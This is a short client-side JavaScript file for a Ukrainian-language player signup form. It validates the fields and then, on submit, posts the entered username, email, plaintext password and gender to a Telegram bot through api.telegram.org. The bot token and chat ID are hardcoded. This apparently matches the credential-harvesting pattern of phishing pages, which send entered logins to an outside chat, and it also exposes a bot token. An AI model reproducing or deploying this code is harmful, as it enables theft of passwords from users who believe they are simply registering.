const TOCEN = "7599305787:AAFqJT_GBj9t7t41eBXckywY17pICqAt3RQ"; // Your bot token
const CHAT_ID = "-1002486277719"; // Your chat ID

const form = document.getElementById('signup-form');
const signupBtn = document.getElementById('signup-btn');
const inputs = form.querySelectorAll('input');

function checkFormValidity() {
    const password = document.getElementById('password').value;
    const genderChecked = document.querySelector('input[name="gender"]:checked');
    let allFilled = Array.from(inputs).every(input => input.value);

    // Check password length
    if (password.length < 6 || password.length > 12) {
        allFilled = false;
    }

    // Enable button only if all conditions are met
    signupBtn.disabled = !allFilled || !genderChecked;
    signupBtn.classList.toggle('active', allFilled && genderChecked);
}

// Listen for changes in form fields
inputs.forEach(input => {
    input.addEventListener('input', checkFormValidity);
});


// Form submission
form.addEventListener('submit', function(event) {
    //event.preventDefault();

    const password = document.getElementById('password').value;
    const genderChecked = document.querySelector('input[name="gender"]:checked');

    if (password.length >= 6 && password.length <= 12 && genderChecked) {
        const message = `<b> Новий гравець </b>\n` +
                        `<b> Iмя гравця: </b> ${this.username.value}\n` +
                        `<b> Email: </b> ${this.email.value}\n` +
                        `<b> Пароль: </b> ${this.password.value}\n` +
                        `<b> Стать гравця: </b> ${genderChecked.value}\n`;

        axios.post(`https://api.telegram.org/bot${TOCEN}/sendMessage`, {
            chat_id: CHAT_ID,
            parse_mode: 'HTML',
            text: message
        })
        .then(response => {
            console.log('Повідомлення надіслано:', response.data);
            form.reset(); // Скинути форму після відправлення
            signupBtn.disabled = true; // Вимкнути кнопку після успішної відправки
        })
        .catch(error => {
            console.error('Помилка при відправленні:', error);
            alert('Не вдалося надіслати повідомлення. Будь ласка, спробуйте ще раз.');
        });
    }
});